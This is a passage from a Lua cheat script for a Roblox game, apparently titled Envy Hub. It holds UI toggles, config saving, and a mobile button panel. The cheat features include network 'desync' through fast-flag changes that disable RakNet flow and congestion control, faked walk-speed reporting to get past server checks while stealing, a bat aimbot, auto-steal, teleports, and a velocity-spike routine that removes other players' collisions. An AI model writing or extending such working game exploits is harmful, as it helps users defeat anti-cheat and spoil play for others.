			instance.Enabled = false
		elseif instance:IsA("Decal") then
			instance.Transparency = 1
		elseif instance:IsA("BasePart") then
			instance.Material = Enum.Material.Plastic
			instance.Reflectance = 0
			instance.CastShadow = false
		end
	end

	local function optimizeLighting()
		_Lighting.GlobalShadows = false
		_Lighting.FogEnd = 9e9
		_Lighting.Brightness = 1
		_Lighting.EnvironmentDiffuseScale = 0
		_Lighting.EnvironmentSpecularScale = 0
		for _, child in pairs(_Lighting:GetChildren()) do
			if child:IsA("BloomEffect") or child:IsA("BlurEffect") or child:IsA("SunRaysEffect") then
				child.Enabled = false
			end
		end
	end

	local function enableAntiLag()
		optimizeLighting()
		for _, desc in pairs(workspace:GetDescendants()) do
			applyAntiLag(desc)
			if desc:IsA("Accessory") then desc:Destroy() end
		end
		if _antiLagConn then _antiLagConn:Disconnect() end
		_antiLagConn = workspace.DescendantAdded:Connect(function(desc)
			applyAntiLag(desc)
			if desc:IsA("Accessory") then desc:Destroy() end
		end)
	end

	local function disableAntiLag()
		if _antiLagConn then _antiLagConn:Disconnect(); _antiLagConn = nil end
	end

	setAntiLag = function(on)
		State.antiLagEnabled = on
		if on then enableAntiLag() else disableAntiLag() end
	end
	local setAntiLagVisual = rowToggle("Performance", "Anti Lag", nil, false, function(on) setAntiLag(on) end)
	local _origSetAntiLag = setAntiLag
	setAntiLag = function(on) setAntiLagVisual(on); _origSetAntiLag(on) end
end

setStretchRez = function(on) if on then enableStretchRez() else disableStretchRez() end end
local setStretchRezVisual = rowToggle("Performance", "Stretch Rez", nil, false, function(on) setStretchRez(on) end)
local _origStretchRez = setStretchRez
setStretchRez = function(on) setStretchRezVisual(on); _origStretchRez(on) end

setRemoveAccessories = function(on) if on then enableRemoveAccessories() else disableRemoveAccessories() end end
local setRemoveAccVisual = rowToggle("Performance", "Remove Accessories", nil, false, function(on) setRemoveAccessories(on) end)
local _origRemoveAcc = setRemoveAccessories
setRemoveAccessories = function(on) setRemoveAccVisual(on); _origRemoveAcc(on) end

setDarkMode = function(on) if on then enableDarkMode() else disableDarkMode() end end
local setDarkModeVisual = rowToggle("Performance", "Dark Mode", nil, false, function(on) setDarkMode(on) end)
local _origDarkMode = setDarkMode
setDarkMode = function(on) setDarkModeVisual(on); _origDarkMode(on) end

makeSecHeader("Settings", "Interface & Binds")

setIntroToggle = rowToggle("Settings", "Play Intro", nil, State.introEnabled, function(on)
	State.introEnabled = on
	pcall(saveConfig)
end)

do
	local musicURLs = {
		"https://files.catbox.moe/zuid5n.mp3",
		"https://files.catbox.moe/z6eqnt.mp3",
		"https://files.catbox.moe/t0nlhv.mp3",
		"https://files.catbox.moe/mthg31.mp3",
		"https://files.catbox.moe/ddnbup.mp3",
		"https://files.catbox.moe/hg5cr4.mp3",
		"https://files.catbox.moe/nps6gk.mp3",
		"https://files.catbox.moe/iyw1cb.mp3",
		"https://files.catbox.moe/2w0wtv.mp3",
	}
	
	local currentPreviewSound = nil
	local isChangingMusic = false
	
	local function stopPreview()
		if currentPreviewSound then
			pcall(function() currentPreviewSound:Stop() end)
			pcall(function() currentPreviewSound:Destroy() end)
			currentPreviewSound = nil
		end
	end
	
	local function playPreview(idx)
		stopPreview()
		task.spawn(function()
			pcall(function()
				local tempFile = "EnvyHubPreview"
				writefile(tempFile, game:HttpGet(musicURLs[idx]))
				currentPreviewSound = Instance.new("Sound", gethui())
				currentPreviewSound.SoundId = getcustomasset(tempFile)
				currentPreviewSound.Volume = 0.5
				currentPreviewSound:Play()
				
				task.delay(10, function()
					stopPreview()
				end)
			end)
		end)
	end
	
	local c = baseCard("Settings", 38)
	cLabel(c, "Intro Music", 10, 130, 11, WHITE, Enum.Font.GothamBold)
	
	local musicBtn = Instance.new("TextButton", c)
	musicBtn.Size = UDim2.new(0, 80, 0, 24)
	musicBtn.Position = UDim2.new(1, -90, 0.5, -12)
	musicBtn.BackgroundColor3 = WHITE
	musicBtn.BorderSizePixel = 0
	musicBtn.Text = "Music " .. State.selectedIntroMusic
	musicBtn.TextColor3 = BG
	musicBtn.Font = Enum.Font.GothamBold
	musicBtn.TextSize = 11
	musicBtn.ZIndex = 11
	Instance.new("UICorner", musicBtn).CornerRadius = UDim.new(0, 5)
    getgenv().EnvyMusicBtn = musicBtn
	
	musicBtn.Activated:Connect(function()
		if isChangingMusic then return end
		isChangingMusic = true
		
		stopPreview()
		task.wait(0.15)
		
		State.selectedIntroMusic = State.selectedIntroMusic + 1
		if State.selectedIntroMusic > #musicURLs then
			State.selectedIntroMusic = 1
		end
		
		musicBtn.Text = "Music " .. State.selectedIntroMusic
		playPreview(State.selectedIntroMusic)
		pcall(saveConfig)
		
		TweenService:Create(musicBtn, TweenInfo.new(0.1), {BackgroundColor3=Color3.fromRGB(200,200,200)}):Play()
		task.delay(0.15, function()
			TweenService:Create(musicBtn, TweenInfo.new(0.1), {BackgroundColor3=WHITE}):Play()
		end)
		
		task.wait(0.5)
		isChangingMusic = false
	end)
	
	musicBtn.MouseEnter:Connect(function()
		TweenService:Create(musicBtn, TweenInfo.new(0.1), {BackgroundColor3=Color3.fromRGB(210,210,210)}):Play()
	end)
	musicBtn.MouseLeave:Connect(function()
		TweenService:Create(musicBtn, TweenInfo.new(0.1), {BackgroundColor3=WHITE}):Play()
	end)
end

uiScaleBox = rowInput("Settings", "UI Scale", nil, uiScaleValue, function(v)
	local n = math.clamp(math.floor(v + 0.5), 50, 150)
	uiScaleValue = n
	if mainUIScale then mainUIScale.Scale = n / 100 end
	pcall(saveConfig)
end)
rowKBOnly("Settings", "Hide / Show GUI", nil, KB.GuiHide, function(k) KB.GuiHide.kb=k end)
setLockUIVisual = rowToggle("Settings", "Lock UI", nil, false, function(on)
	uiLocked = on
	autoSavePositions()
end)
local saveBtn; saveBtn = rowActionBtn("Settings", "Save Config", function()
	if saveConfig then
		pcall(function() saveConfig(saveBtn) end)
		if saveBtn then
			local prev = saveBtn.Text
			saveBtn.Text = "✓ Saved!"
			task.delay(1.5, function() if saveBtn and saveBtn.Parent then saveBtn.Text = prev end end)
		end
	end
end)
rowActionBtn("Settings", "Reset Mobile Buttons", function()
	if resetMobileButtons then resetMobileButtons() end
end)

end -- tab content scope

-- ==================== RUBY-STYLE MOBILE PANEL ====================
do
	local BTN_SIZE = 58
	local BTN_GAP  = 14
	local PADDING  = 6
	local COLS     = 2
	local ROWS     = 4
	local PANEL_W  = PADDING * 2 + COLS * BTN_SIZE + (COLS - 1) * BTN_GAP
	local PANEL_H  = PADDING * 2 + ROWS * BTN_SIZE + (ROWS - 1) * BTN_GAP

	MobilePanel = Instance.new("Frame")
	MobilePanel.Name = "MobileButtonsPanel"
	MobilePanel.Size = UDim2.new(0, PANEL_W, 0, PANEL_H)
	MobilePanel.Position = UDim2.new(1, -(PANEL_W + 20), 1, -(PANEL_H + 20))
	MobilePanel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	MobilePanel.BackgroundTransparency = 1
	MobilePanel.BorderSizePixel = 0
	MobilePanel.ZIndex = 95
	MobilePanel.Parent = gui
	-- no UICorner needed since panel is invisible

	makeDraggable(MobilePanel)
	MobilePanel.InputEnded:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
			task.defer(function() pcall(saveConfig) end)
		end
	end)

	resetMobileButtons = function()
		MobilePanel.Position = UDim2.new(1, -(PANEL_W + 20), 1, -(PANEL_H + 20))
		task.defer(function() pcall(saveConfig) end)
	end

	-- OFF: black btn, white text  |  ON: white btn, black text
	local Q_OFF      = Color3.fromRGB(0,   0,   0)
	local Q_ON       = Color3.fromRGB(255, 255, 255)
	local Q_TEXT_OFF = Color3.fromRGB(255, 255, 255)
	local Q_TEXT_ON  = Color3.fromRGB(0,   0,   0)

	local function createMobileButton(name, displayText, col, row, isToggle, onAction)
		local xPos = PADDING + col * (BTN_SIZE + BTN_GAP)
		local yPos = PADDING + row * (BTN_SIZE + BTN_GAP)

		local btn = Instance.new("TextButton")
		btn.Name = "Btn_" .. name
		btn.Size = UDim2.new(0, BTN_SIZE, 0, BTN_SIZE)
		btn.Position = UDim2.new(0, xPos, 0, yPos)
		btn.BackgroundColor3 = Q_OFF
		btn.Text = displayText
		btn.TextColor3 = Q_TEXT_OFF
		btn.TextScaled = false; btn.TextSize = 11
		btn.Font = Enum.Font.GothamBold
		btn.TextWrapped = true; btn.LineHeight = 1.2
		btn.BorderSizePixel = 0; btn.AutoButtonColor = false
		btn.ZIndex = 99
		btn.Parent = MobilePanel
		Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

		local isOn = false
		local function setter(s)
			isOn = s
			TweenService:Create(btn, TweenInfo.new(0.15), {
				BackgroundColor3 = s and Q_ON or Q_OFF,
				TextColor3       = s and Q_TEXT_ON or Q_TEXT_OFF,
			}):Play()
		end

		-- flash feedback for non-toggle buttons
		local function flash()
			TweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3=Color3.fromRGB(200,200,200), TextColor3=Q_TEXT_ON}):Play()
			task.delay(0.22, function()
				TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3=Q_OFF, TextColor3=Q_TEXT_OFF}):Play()
			end)
		end

		btn.Activated:Connect(function()
			if isToggle then
				isOn = not isOn; setter(isOn)
				if onAction then onAction(isOn) end
			else
				flash()
				if onAction then onAction() end
			end
		end)

		return btn, setter
	end

	-- Row 0: DROP | AUTO LEFT
	-- Row 1: BAT AIMBOT | AUTO RIGHT
	-- Row 2: TP DOWN | CARRY SPD
	-- Row 3: LAGGER | BAT COUNTER
	createMobileButton("Drop", "DROP\nBR", 0, 0, false, function() task.spawn(runDrop) end)

	local _, saAL = createMobileButton("AutoLeft", "AUTO\nLEFT", 1, 0, true, function(on)
		State.autoLeftEnabled = on
		if on then
			if State.autoRightEnabled then State.autoRightEnabled=false; if autoRightSetVisual then autoRightSetVisual(false) end; stopAutoRight() end
			if State.autoBatToggled then State.autoBatToggled=false; if autoBatSetVisual then autoBatSetVisual(false) end; stopBatAimbot() end
			startAutoLeft()
		else stopAutoLeft() end
		if autoLeftSetVisual then autoLeftSetVisual(State.autoLeftEnabled) end
	end)
	autoLeftSetVisual = function(on) saAL(on) end

	local _, saAB = createMobileButton("AutoBat", "BAT\nAIMBOT", 0, 1, true, function(on)
		State.autoBatToggled = on
		if on then startBatAimbot() else stopBatAimbot() end
	end)
	autoBatSetVisual = function(on) saAB(on); if setAutoBat then setAutoBat(on) end end

	local _, saAR = createMobileButton("AutoRight", "AUTO\nRIGHT", 1, 1, true, function(on)
		State.autoRightEnabled = on
		if on then
			if State.autoLeftEnabled then State.autoLeftEnabled=false; if autoLeftSetVisual then autoLeftSetVisual(false) end; stopAutoLeft() end
			if State.autoBatToggled then State.autoBatToggled=false; if autoBatSetVisual then autoBatSetVisual(false) end; stopBatAimbot() end
			startAutoRight()
		else stopAutoRight() end
		if autoRightSetVisual then autoRightSetVisual(State.autoRightEnabled) end
	end)
	autoRightSetVisual = function(on) saAR(on) end

	createMobileButton("TPDown", "TP\nDOWN", 0, 2, false, function() task.spawn(runTPDown) end)

	local _, saCS = createMobileButton("Speed", "CARRY\nSPD", 1, 2, true, function(on)
		State.speedToggled = on; State.laggerToggled = false; laggerPhase = 0
		if mobileLaggerSetActive then mobileLaggerSetActive(false) end
		if modeValLbl then modeValLbl.Text = on and "Carry" or "Normal" end
	end)
	mobileSpeedSetActive = function(on) saCS(on) end

	local saLC -- forward declare so saLM callback can reference it
	local _, saLM = createMobileButton("Lagger", "LAGGER\nMODE", 1, 3, true, function(on)
		State.laggerToggled = on; laggerPhase = on and 1 or 0
		if on then
			State.speedToggled = false
			if mobileSpeedSetActive then mobileSpeedSetActive(false) end
			saLC(false) -- visual only, no callback
			if modeValLbl then modeValLbl.Text = "Lagger" end
		else
			laggerPhase = 0
			if modeValLbl then modeValLbl.Text = "Normal" end
		end
	end)
	mobileLaggerSetActive = function(on) saLM(on); if not on then laggerPhase = 0 end end

	_, saLC = createMobileButton("LaggerCarry", "LAGGER\nCARRY", 0, 3, true, function(on)
		State.laggerToggled = on; laggerPhase = on and 2 or 0
		if on then
			State.speedToggled = false
			if mobileSpeedSetActive then mobileSpeedSetActive(false) end
			saLM(false) -- visual only, no callback
			if modeValLbl then modeValLbl.Text = "Lagger Carry" end
		else
			laggerPhase = 0
			if modeValLbl then modeValLbl.Text = "Normal" end
		end
	end)
	mobileLaggerCarrySetActive = function(on) saLC(on) end

	mobileBtnActive.AutoLeft  = saAL
	mobileBtnActive.AutoRight = saAR
	mobileBtnActive.AutoBat   = saAB
end

saveConfig = function(btn)
	local function ks(e) return {kb=e.kb and e.kb.Name or nil, gp=e.gp and e.gp.Name or nil} end
	local cfg = {
		normalSpeed=NS, carrySpeed=CS, laggerSpeed=LS,
		introEnabled=State.introEnabled,
		selectedIntroMusic=State.selectedIntroMusic,
		autoLeftKey=ks(KB.AutoLeft), autoRightKey=ks(KB.AutoRight),
		dropKey=ks(KB.Drop), tpDownKey=ks(KB.TPDown),
		autoBatKey=ks(KB.AutoBat), speedKey=ks(KB.Speed), guiHideKey=ks(KB.GuiHide),
		laggerKey=ks(KB.Lagger),
		grabRadius=Steal.StealRadius,
		infJump=State.infJumpEnabled, antiRagdoll=State.antiRagdollEnabled,
		autoStealEnabled=Steal.AutoStealEnabled, unwalkEnabled=State.unwalkEnabled,
		laggerMode=State.laggerToggled, uiLocked=uiLocked,
		autoBatToggled=State.autoBatToggled,
		desyncEnabled=State.desyncEnabled,
		mainPos=main and {xs=main.Position.X.Scale,xo=main.Position.X.Offset,ys=main.Position.Y.Scale,yo=main.Position.Y.Offset} or nil,
		miniPos=mini and {xs=mini.Position.X.Scale,xo=mini.Position.X.Offset,ys=mini.Position.Y.Scale,yo=mini.Position.Y.Offset} or nil,
		panelPos=MobilePanel and {xs=MobilePanel.Position.X.Scale,xo=MobilePanel.Position.X.Offset,ys=MobilePanel.Position.Y.Scale,yo=MobilePanel.Position.Y.Offset} or nil,
		pbPos=pbFrame and {xs=pbFrame.Position.X.Scale,xo=pbFrame.Position.X.Offset,ys=pbFrame.Position.Y.Scale,yo=pbFrame.Position.Y.Offset} or nil,
	}
	local ok = pcall(function()
		local encoded = HttpService:JSONEncode(cfg)
		if writefile then writefile("EnvyMobileConfig.json", encoded) end
	end)
	if not ok then
		pcall(function()
			local encoded = HttpService:JSONEncode(cfg)
			if _writefile then _writefile("EnvyMobileConfig.json", encoded) end
		end)
	end
	if btn then
		local prev = btn.Text
		btn.Text = ok and "✓  Saved!" or "✕  Failed!"
		task.wait(1.5); btn.Text = prev
	end
end





-- ─── Desync (Ruby/Dark Hub logic) ────────────────────────────────────────────
do
local DS = {
	active = false, conn = nil, invisiblePart = nil,
	originalWalk = nil, lastWalkWritten = nil,
	lastSnapTime = 0, postSimLastT = 0,
	linearVelocity = nil, networkRefreshConn = nil,
	savedSpeed = nil, fflagLastApplyT = 0,
	LV_MAX_FORCE = 1.2e7, VEL_SMOOTH_HZ = 4.25,
	SNAP_MIN_INTERVAL = 0.14,
	DRIVE_MIN = 20, DRIVE_MAX = 29,
	REPORT_WALK_MIN_TOUCH = 38, REPORT_WALK_MAX_TOUCH = 56,
	REPORT_PER_DRIVE_TOUCH = 1.48, REPORT_PER_DRIVE_OFF_TOUCH = 3.2,
	BYPASS_STEAL_MIN = 40, BYPASS_STEAL_MAX = 51,
}

local DESYNC_HUB_FFLAGS = {
	S2PhysicsSenderRate = 15000, DFIntConnectionMTUSize = 1400,
	DFIntRakNetResendBufferArrayLength = 128, DFIntRakNetResendTimeoutMS = 300,
	DFIntNetworkLatencyTolerance = 1, DFIntNetworkPrediction = 1,
	FFlagRakNetDisableFlowControl = true, DFFlagRakNetDisableCongestionControl = true,
	DFIntTaskSchedulerTargetFps = 29383, FFlagGameBasicSettingsFramerateCap5 = false,
	FFlagTaskSchedulerLimitTargetFpsTo2402 = false,
}

local function applyDesyncFFlags()
	local now = tick()
	if (now - DS.fflagLastApplyT) < 0.75 then return end
	DS.fflagLastApplyT = now
	if type(setfflag) ~= "function" then return end
	for name, value in pairs(DESYNC_HUB_FFLAGS) do
		pcall(function() setfflag(tostring(name), tostring(value)) end)
	end
end

local function setRaknetDesync(on)
	pcall(function() local g=(getgenv and getgenv()) or _G; local r=rawget(g,"raknet"); if type(r)=="table" and type(r.desync)=="function" then r.desync(on) end end)
	pcall(function() local g=(getgenv and getgenv()) or _G; local n=rawget(g,"network"); if type(n)=="table" and type(n.desync)=="function" then n.desync(on) end end)
	pcall(function() local g=(getgenv and getgenv()) or _G; local f=rawget(g,"fluxus"); if type(f)=="table" and type(f.network_desync)=="function" then f.network_desync(on) end end)
end

local function teardownDesyncPhys()
	if DS.conn then DS.conn:Disconnect(); DS.conn = nil end
	if DS.networkRefreshConn then DS.networkRefreshConn:Disconnect(); DS.networkRefreshConn = nil end
	pcall(function() if DS.invisiblePart then DS.invisiblePart:Destroy() end end)
	DS.invisiblePart = nil
	for _, inst in ipairs(workspace:GetChildren()) do
		if inst.Name == "DarkHub_DesyncPos" then pcall(function() inst:Destroy() end) end
	end
	local ch = LP.Character
	local hum = ch and ch:FindFirstChildOfClass("Humanoid")
	if hum and DS.originalWalk ~= nil then pcall(function() hum.WalkSpeed = DS.originalWalk end) end
	DS.originalWalk = nil; DS.lastWalkWritten = nil
	DS.lastSnapTime = 0; DS.postSimLastT = 0; DS.linearVelocity = nil
end

local snapDesyncFollower
local function updateDesyncMovement(dt)
	dt = (type(dt)=="number" and dt>0 and dt<0.5) and dt or (1/60)
	local blend = math.clamp(dt * DS.VEL_SMOOTH_HZ, 0.08, 0.5)
	local function applySmoothedHorizontal(tvx, tvz)
		local cur = DS.invisiblePart.AssemblyLinearVelocity
		local v = Vector3.new(cur.X+(tvx-cur.X)*blend, cur.Y, cur.Z+(tvz-cur.Z)*blend)
		if DS.linearVelocity and DS.linearVelocity.Parent then DS.linearVelocity.VectorVelocity = v
		else DS.invisiblePart.AssemblyLinearVelocity = v end
	end
	if not DS.active or not DS.invisiblePart or not DS.invisiblePart.Parent then return end
	local char = LP.Character
	if not char or DS.invisiblePart.Parent ~= char then return end
	local humanoid = char:FindFirstChildOfClass("Humanoid")
	local hrp2 = char:FindFirstChild("HumanoidRootPart")
	if not humanoid or not hrp2 then return end
	if humanoid.Health <= 0 then
		local zv = Vector3.new(0, DS.invisiblePart.AssemblyLinearVelocity.Y, 0)
		if DS.linearVelocity and DS.linearVelocity.Parent then DS.linearVelocity.VectorVelocity = zv
		else DS.invisiblePart.AssemblyLinearVelocity = zv end
		return
	end
	local moveDir = humanoid.MoveDirection
	local moving = moveDir.Magnitude > 0.02
	local driveUnit = moving and moveDir.Unit or nil
	local orig = math.clamp(DS.originalWalk or 16, 6, 34)
	local t2 = math.clamp((orig-6)/28, 0, 1)
	local driveS = DS.DRIVE_MIN + t2*(DS.DRIVE_MAX-DS.DRIVE_MIN)
	local reportW = math.clamp(driveS*DS.REPORT_PER_DRIVE_TOUCH+DS.REPORT_PER_DRIVE_OFF_TOUCH, DS.REPORT_WALK_MIN_TOUCH, DS.REPORT_WALK_MAX_TOUCH)
	if State.isStealing then driveS = math.clamp(30, DS.BYPASS_STEAL_MIN, DS.BYPASS_STEAL_MAX); reportW = driveS end
	if moving then
		if DS.lastWalkWritten==nil or math.abs(DS.lastWalkWritten-reportW)>0.28 then pcall(function() humanoid.WalkSpeed=reportW end); DS.lastWalkWritten=reportW end
		applySmoothedHorizontal(driveUnit.X*driveS, driveUnit.Z*driveS)
	else
		if DS.lastWalkWritten==nil or math.abs(DS.lastWalkWritten-reportW)>0.35 then pcall(function() humanoid.WalkSpeed=reportW end); DS.lastWalkWritten=reportW end
		applySmoothedHorizontal(0, 0)
	end
end

snapDesyncFollower = function()
	if not DS.active or not DS.invisiblePart or not DS.invisiblePart.Parent then return end
	local c = LP.Character
	if not c or DS.invisiblePart.Parent ~= c then return end
	local hrp2 = c:FindFirstChild("HumanoidRootPart"); if not hrp2 then return end
	local now = tick()
	if DS.lastSnapTime>0 and (now-DS.lastSnapTime)<DS.SNAP_MIN_INTERVAL then return end
	DS.lastSnapTime = now
	DS.invisiblePart.CFrame = hrp2.CFrame * CFrame.new(0,0,-2.85)
end

local function setupDesyncCharacter(char)
	teardownDesyncPhys()
	if not DS.active then return end
	local humanoid = char:WaitForChild("Humanoid",15)
	local hrp2 = char:WaitForChild("HumanoidRootPart",15)
	if not humanoid or not hrp2 then return end
	DS.originalWalk = humanoid.WalkSpeed; DS.lastWalkWritten = nil; DS.linearVelocity = nil
	DS.invisiblePart = Instance.new("Part")
	DS.invisiblePart.Name = "DarkHub_DesyncFollower"
	DS.invisiblePart.Size = Vector3.new(2,1,2)
	DS.invisiblePart.Transparency = 1; DS.invisiblePart.CanCollide = false
	DS.invisiblePart.Anchored = false; DS.invisiblePart.Massless = true
	DS.invisiblePart.Parent = char
	local dhAtt = Instance.new("Attachment"); dhAtt.Name = "DH_DesyncDrive"; dhAtt.Parent = DS.invisiblePart
	local lv = Instance.new("LinearVelocity"); lv.Name = "DH_DesyncLinearVelocity"
	lv.Attachment0 = dhAtt; lv.RelativeTo = Enum.ActivationRelativeTo.World
	lv.MaxForce = DS.LV_MAX_FORCE; lv.VectorVelocity = Vector3.zero; lv.Parent = DS.invisiblePart
	DS.linearVelocity = lv
	local welded = false
	pcall(function()
		local w = Instance.new("Weld"); w.Name = "DH_DesyncWeld"
		w.Part0 = hrp2; w.Part1 = DS.invisiblePart; w.C0 = CFrame.new(0,0,-3.85); w.Parent = DS.invisiblePart
		welded = true
	end)
	if not welded then
		DS.invisiblePart.CFrame = hrp2.CFrame * CFrame.new(0,0,-3.85)
		local wc = Instance.new("WeldConstraint"); wc.Name = "DH_DesyncWeldConstraint"
		wc.Part0 = hrp2; wc.Part1 = DS.invisiblePart; wc.Parent = DS.invisiblePart
	end
	task.defer(function() DS.lastSnapTime=0; snapDesyncFollower(); RunService.Heartbeat:Wait(); snapDesyncFollower() end)
	task.delay(0.15, snapDesyncFollower)
	DS.postSimLastT = os.clock()
	local stepper = RunService.PostSimulation or RunService.Heartbeat
	DS.conn = stepper:Connect(function()
		local now = os.clock(); local dt = math.clamp(now-DS.postSimLastT, 1/240, 1/25)
		DS.postSimLastT = now; updateDesyncMovement(dt)
	end)
	local refreshAccum = 0
	DS.networkRefreshConn = RunService.Heartbeat:Connect(function(dt)
		if not DS.active then return end
		refreshAccum += (type(dt)=="number" and dt or 1/60)
		if refreshAccum < 1.2 then return end
		refreshAccum = 0
		if DS.active then DS.fflagLastApplyT=0; applyDesyncFFlags() end
	end)
	DS.fflagLastApplyT = 0; applyDesyncFFlags()
	task.delay(0.45, function() if DS.active then DS.fflagLastApplyT=0; applyDesyncFFlags() end end)
	task.delay(1.35, function() if DS.active then DS.fflagLastApplyT=0; applyDesyncFFlags() end end)
end

stopDesyncSession = function()
	setRaknetDesync(false); DS.active = false; teardownDesyncPhys(); DS.savedSpeed = nil
	State.desyncEnabled = false
	if setDesync then setDesync(false) end
	if saDesync then saDesync(false) end
end

startDesyncSession = function()
	if DS.active then return end
	teardownDesyncPhys(); DS.savedSpeed = nil; DS.fflagLastApplyT = 0
	applyDesyncFFlags(); setRaknetDesync(true); DS.active = true
	State.desyncEnabled = true
	if setDesync then setDesync(true) end
	if saDesync then saDesync(true) end
	task.spawn(function()
		pcall(function() LP:LoadCharacter() end)
		for _, delay in ipairs({0.12, 0.45, 1.2}) do
			task.wait(delay)
			if not DS.active then return end
			local ch = LP.Character
			if ch and (not DS.invisiblePart or not DS.invisiblePart.Parent) then
				setupDesyncCharacter(ch)
				if DS.invisiblePart and DS.invisiblePart.Parent then break end
			end
		end
		task.wait(3.5)
		if not DS.active then return end
		local ch = LP.Character
		if ch and (not DS.invisiblePart or not DS.invisiblePart.Parent) then setupDesyncCharacter(ch) end
	end)
end

LP.CharacterAdded:Connect(function(char)
	if DS.active then
		DS.fflagLastApplyT = 0; applyDesyncFFlags()
		task.delay(0.45, function()
			if DS.active and LP.Character==char then DS.fflagLastApplyT=0; applyDesyncFFlags() end
		end)
		task.defer(function()
			setupDesyncCharacter(char)
			if DS.active and (not DS.invisiblePart or not DS.invisiblePart.Parent) then
				task.delay(0.35, function()
					if DS.active and LP.Character==char then setupDesyncCharacter(LP.Character) end
				end)
			end
		end)
	end
end)
end
-- ─── End of Desync ────────────────────────────────────────────────────────────


-- ============================================================
-- OPIUM v5.2 LOGIC (message 9) - adapted for Envy Mobile
-- ============================================================
;(function()

local _isfile   = isfile   or (syn and syn.isfile)   or (getgenv and getgenv().isfile)   or function() return false end
local _readfile = readfile  or (syn and syn.readfile)  or (getgenv and getgenv().readfile)  or function() return nil  end
local _writefile= writefile or (syn and syn.writefile) or (getgenv and getgenv().writefile) or function() end
local getconnections = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)

local MOVE_KEYS={[Enum.KeyCode.W]=true,[Enum.KeyCode.A]=true,[Enum.KeyCode.S]=true,[Enum.KeyCode.D]=true,
    [Enum.KeyCode.Up]=true,[Enum.KeyCode.Left]=true,[Enum.KeyCode.Down]=true,[Enum.KeyCode.Right]=true}
local PLOT_CACHE_DURATION=2; local PROMPT_CACHE_REFRESH=0.15
local STEAL_COOLDOWN=0.1; local MEDUSA_COOLDOWN=25; local DROP_AUTO_OFF_DELAY=0.15
local CONFIG_FILE="EnvyMobileConfig.json"

-- Extra State fields from message 9
State.autoLeftPhase=1; State.autoRightPhase=1
State.medusaLastUsed=0; State.medusaDebounce=false; State.medusaCounterEnabled=false
State.batAimbotToggled=false; State.autoSwingEnabled=false
State.hittingCooldown=false
State.batCounterEnabled=false; State.batCounterDebounce=false
State.dropEnabled=false; State._tpInProgress=false
State.lastMoveDir=Vector3.new(0,0,0)
State._prevCarry=CS; State._prevSpeed=false
State.laggerEnabled=false

-- Extra Conns
Conns.autoLeft=nil; Conns.autoRight=nil; Conns.aimbot=nil
Conns.batCounter=nil; Conns.unwalk=nil

-- Presets
local Presets={}
local PRESET_FILE="EnvyMobilePresets.json"; local LAST_PRESET_FILE="EnvyMobileLastPreset.json"
local function buildPresetSnapshot()
    return {normalSpeed=NS,carrySpeed=CS,laggerSpeed=LS,stealRadius=Steal.StealRadius,
        infJump=State.infJumpEnabled,
        antiRagdoll=State.antiRagdollEnabled,fpsBoost=State.fpsBoostEnabled,
        medusaCounter=State.medusaCounterEnabled,batCounter=State.batCounterEnabled,
        autoSteal=Steal.AutoStealEnabled,uiScale=uiScaleValue}
end
local function savePresetsFile()
    local ok,enc=pcall(function() return HttpService:JSONEncode(Presets) end)
    if ok then pcall(function() _writefile(PRESET_FILE,enc) end) end
end
local function loadPresetsFile()
    local hasFile=false; pcall(function() hasFile=_isfile(PRESET_FILE) end)
    if not hasFile then return end
    local raw; pcall(function() raw=_readfile(PRESET_FILE) end)
    if not raw then return end
    local ok,dec=pcall(function() return HttpService:JSONDecode(raw) end)
    if ok and dec then Presets=dec end
end
local function saveLastPresetName(name)
    local ok,enc=pcall(function() return HttpService:JSONEncode({lastPreset=name}) end)
    if ok then pcall(function() _writefile(LAST_PRESET_FILE,enc) end) end
end
local function loadLastPresetName()
    local hasFile=false; pcall(function() hasFile=_isfile(LAST_PRESET_FILE) end)
    if not hasFile then return nil end
    local raw; pcall(function() raw=_readfile(LAST_PRESET_FILE) end)
    if not raw then return nil end
    local ok,dec=pcall(function() return HttpService:JSONDecode(raw) end)
    if ok and dec then return dec.lastPreset end; return nil
end

-- setInfJump, setAntiRag, setFps, setMedusaCounter, setBatCounter, setInstaGrab
-- are outer upvalues declared at line 296 and assigned by the UI rows above
local setAutoSwingVisual
-- autoLeftSetVisual, autoRightSetVisual, autoBatSetVisual are outer upvalues

-- ============================================================
-- ANTI-MEDUSA RESET
-- ============================================================
-- ============================================================
-- TP DOWN
-- ============================================================
local function doTpDown()
    pcall(function()
        local c=LP.Character; if not c then return end
        local root=c:FindFirstChild("HumanoidRootPart"); if not root then return end
        local rp=RaycastParams.new(); rp.FilterDescendantsInstances={c}; rp.FilterType=Enum.RaycastFilterType.Exclude
        local res=workspace:Raycast(root.Position,Vector3.new(0,-1000,0),rp)
        if res then root.CFrame=CFrame.new(res.Position+Vector3.new(0,root.Size.Y/2+0.5,0)); root.AssemblyLinearVelocity=Vector3.zero end
    end)
end

-- ============================================================
-- DROP BRAINROT
-- ============================================================
local _dropConns={}
local function runDropBrainrot()
    if State.dropEnabled then return end; State.dropEnabled=true
    task.spawn(function()
        local colConn=RunService.Stepped:Connect(function()
            if not State.dropEnabled then return end
            for _,p in ipairs(Players:GetPlayers()) do
                if p~=LP and p.Character then
                    for _,part in ipairs(p.Character:GetChildren()) do if part:IsA("BasePart") then part.CanCollide=false end end
                end
            end
        end)
        table.insert(_dropConns,colConn)
        task.spawn(function()
            while State.dropEnabled do
                RunService.Heartbeat:Wait()
                local c=LP.Character; local root=c and c:FindFirstChild("HumanoidRootPart")
                if not root then break end
                local vel=root.Velocity; root.Velocity=vel*10000+Vector3.new(0,10000,0)
                RunService.RenderStepped:Wait(); if root and root.Parent then root.Velocity=vel end
                RunService.Stepped:Wait(); if root and root.Parent then root.Velocity=vel+Vector3.new(0,0.1,0) end
            end
        end)
        task.wait(DROP_AUTO_OFF_DELAY); State.dropEnabled=false
        for _,cn in ipairs(_dropConns) do pcall(function() cn:Disconnect() end) end; _dropConns={}
    end)
end

-- ============================================================
-- startBatAimbot/stopBatAimbot defined above (message5 velocity-chase logic)

-- ============================================================
-- BAT COUNTER
-- ============================================================
